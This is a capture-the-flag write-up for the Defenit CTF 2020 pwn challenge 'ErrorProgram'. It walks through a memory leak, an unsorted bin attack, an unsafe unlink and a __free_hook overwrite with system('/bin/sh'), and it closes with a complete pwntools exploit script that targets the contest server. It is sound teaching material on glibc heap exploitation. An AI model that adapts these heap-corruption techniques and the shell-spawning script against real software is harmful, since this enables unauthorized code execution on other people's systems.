# Defenit CTF 2020 - ErrorProgram

This is a write-up for the Pwn challenge ErrorProgram, in Defenit CTF 2020.
## Problem
We are provided with a binary called `errorProgram` along with a libc.
## Goal
Pwn problem. Get the shell
## Analysis
There are three menus in this program, that lets us use some of the famous exploits. First, we have the menu for BOF, but this is useless because there are both a custom stack cookie and a compiler-generated stack cookie protecting the buffer boundary. Next, we have the menu for FSB.  We can `printf()` what we have written directly, but in this time, we cannot use any `%` or `$`, which is essential for FSB attacks. Lastly, we have the UAF menu, which allows us to allocate a buffer from size `0x777`to `0x7777`, free it, write up to `0x777` bytes onto them, and read 16 bytes of them regardless of whether if the buffer is allocated or not.  However, the program only has 4 slots to hold the buffer's address and lacks a way to clear it, limiting the usable `malloc()` attempts to 4.

The binary has PIE and full RELRO.

## Solution

### Getting the Code Segment Address Leak

The FSB menu looked useless in first glance, but it was crucial because we could get the required leaks from it.

	  printf("Input your payload : ");
	  read(0, buf, 0x777uLL);
	  for ( i = 0; i <= 0x776; ++i )
	  {
	    if ( !buf[i] )
	    {
	      memset(&buf[i], 0, 0x777 - i);
	      break;
	    }
	  }
	  if ( strchr(buf, '%') || strchr(buf, '$') )
	  {
	    puts("WRONG ACCESS! (PRINT FSB)");
	    exit(0x777);
	  }
As the program doesn't `memset()`the buffer prior to the `read()`call, we can use this to leak the stack address and the code address. It sometimes doesn't work if there is a bad `%` or `$` in the address tho :q

Now we have code base address, therefore we know the address of *slots* for buffers on BSS by simply adding 0x202060 offest to the code base address.

### Getting Libc Leak

```python
alloc(0, 0x777) # allocate slot 0 with 0x777 size
alloc(1, 0x777) # allocate slot 1 with 0x777 size
free(0) # free slot 0
leak = read(0) # read 16 bytes from slot 0
fd = u64(leak[8:]) # unpacks 8 bytes into integer
bk = u64(leak[:8]) # unpacks 8 bytes into integer
```

This code gets **libc leak** from the program. It allocates two chunks in heap. Chunk 1 is for preventing consolidation. Because chunk size 0x777 is in **smallbin** range, if allocating and freeing chunk 0, free function writes the address of *libc main arena* into fd and bk. Reading 16 bytes of the chunk gets fd and bk, therefore we can get libc leak.

### Unsorted bin Attack

We can modify freed chunk, therefore we can compose unsorted bin attack. At this moment, there is no free chunk in fastbin, smallbin, largebin and tcache. Allocating new chunk, the program searchs unsorted bin, and there is an unsorted bin in bin list. Modifying chunk 0's bk is enough to compose unsorted bin attack.

```python
# chunk 0 is freed, and modify its bk
write(0, p64(fd)+p64(code_base+0x202058+0x10))
# allocating new chunk
alloc(2, 0x777)
```

```(code_base+0x202058+0x10)->fd``` is the address of ```slot[3]```, ```code_base+0x202078```. ```(chunk 0)->bk``` is ```code_base+0x202058+0x10```. 

When the program allocates chunk 2, there is free chunk, chunk 0, in unsorted bin. When malloc(0x777) is called, the code below will be executed.

```c
// in malloc.c
bck = victim->bk;
unsorted_chunks (av)->bk = bck;
bck->fd = unsorted_chunks (av);
```

```victim``` is address of chunk 0. ```victim->bk``` is ```code_base+0x202058+0x10```. Now bck is ```code_base+0x202058+0x10```. Therefore, the program writes ```unsorted_chunks (av)``` on  ```bck->fd == code_base+0x202078 == slot[3]```. Finally, ```slot[3]``` is ```&libc_main_arena+98```. We got access to libc main arena, both read and write.

### Unsafe Unlink

We can freely read and write libc_main arena, we can get heap leak simply reading ```slot[3]```

We can also write main_arena, we can clean-up main_arena for preventing crashing.

```python
heap_leak = u64(read(3)[:8]) # gets heap leak, that is address of chunk 0
# clean-up pointers
write(0, p64(fd)*2) # write main_arena+98 on chunk 0
write(3, p64(heap_leak)*2+p64(fd)*2) # write &(chunk 0) on main_arena+98
# free chunk 0
free(0)
```

This code removes corruption and successfully free chunk 0.

```python
write(0,p64(0)*2+p64(code_base+0x202070-0x18) + p64(code_base+0x202070-0x10) + "\0" * 0x750 + p64(0x770)[:7])
write(3, p64(heap_leak)*2+p64(fd)*2) # for preventing corruption
```

Now chunk 0 is freed, therefore ```prev_inuse``` in next chunk, chunk 1 is 0. We can write 0x777 bytes on chunk 0. We can make fake chunk and fake prev_size. Chunk 1's prev_size is 0x770, which points the fake chunk. Because fake chunk's prev_size and size are zero, and ```&fake_chunk->fd->bk==&fake_chunk-bk->fd```, we can pass sanity check.

```python
free(1)
```

This makes two chunks consolidate, and one chunk is a fake chunk. 

```&fake_chunk-bk->fd==code_base+0x202070``` is ```slot[2]```. when freeing chunk 1, it writes ```code_base+0x202070-0x18==&slot[-1]``` on ```slot[2]```

Now we got read and write access on ```slot```

### Getting Shell

We can read and write anywhere, getting shell is now easy.

```python
fhook = fd-0x7f2ed43b2ca0+0x7f2ed43b48e8 # pre-calculated address, &__free_hook
system = fhook-0x3ed8e8+0x4f440 # system function address

# write &__free_hook on slot[0]
write(2,p64(0)+p64(fhook)+p64(0))
# write system on __free_hook
write(0,p64(system))
# write "/bin/sh" in somewhere, slot[3]
write(3,"/bin/sh")
# free(slot[3]) called, and system("/bin/sh") called
free(3)
```

## Full Code

```python
from pwn import *

#p = process("errorProgram")
p = remote("error-program.ctf.defenit.kr", 7777)

# interface functions
def menu(n):
    p.recvuntil(":")
    p.sendline(str(n))

def alloc(index, size):
    menu(1)
    p.recvuntil("INDEX")
    p.sendline(str(index))
    p.recvuntil("SIZE")
    p.sendline(str(size))

def free(index):
    menu(2)
    p.recvuntil("INDEX")
    p.sendline(str(index))

def write(index, content):
    menu(3)
    p.recvuntil("INDEX")
    p.sendline(str(index))
    p.recvuntil("DATA")
    p.sendline(content)

def read(index):
    menu(4)
    p.recvuntil("INDEX")
    p.sendline(str(index))
    p.recvuntil("DATA : ")
    return p.recvn(0x10)

# functions for getting leak
def stack_leak():
    menu(5)
    menu(2)
    p.sendafter("your payload : ", "A"*248)
    p.recvuntil("A"*248)
    leak = p.recvline().strip().ljust(8,"\0")
    menu(3)
    return u64(leak) - 0x20

def code_leak():
    menu(5)
    menu(2)
    p.sendafter("your payload : ", "A"*240)
    p.recvuntil("A"*240)
    leak = p.recvline().strip().ljust(8,"\0")
    menu(3)
    return u64(leak) - 0x1338

def write_stack(data):
    menu(5)
    menu(1)
    p.sendafter("your payload : ", data)
    menu(3)

# exploit function
def pwn(code_base):
		# get libc leak
    alloc(0, 0x777)
    alloc(1, 0x777)
    free(0)
    leak = read(0)
    fd = u64(leak[8:])
    bk = u64(leak[:8])
    print(hex(fd), hex(bk), hex(code_base))
    
    # unsorted bin attack
    write(0,p64(fd)+p64(code_base+0x202058+0x10))
    alloc(2, 0x777)
    heap_leak = u64(read(3)[:8])
    print(hex(heap_leak))
    
    # unsafe unlink
    write(0, p64(fd)*2)
    write(3, p64(heap_leak)*2+p64(fd)*2)
    free(0)
    write(0,p64(0)*2+p64(code_base+0x202070-0x18) + p64(code_base+0x202070-0x10) + "\0" * 0x750 + p64(0x770)[:7])
    write(3, p64(heap_leak)*2+p64(fd)*2)
    free(1)
		
    # getting shell
    fhook = fd-0x7f2ed43b2ca0+0x7f2ed43b48e8
    system = fhook-0x3ed8e8+0x4f440
    write(2,p64(0)+p64(fhook)+p64(0))
    write(0,p64(system))
    write(3,"/bin/sh")
    free(3)
    
if __name__ == "__main__":
  	menu(3)
    code_base = code_leak()
    print(hex(stack_leak()))
    print(pwn(code_base))
    p.interactive()
```



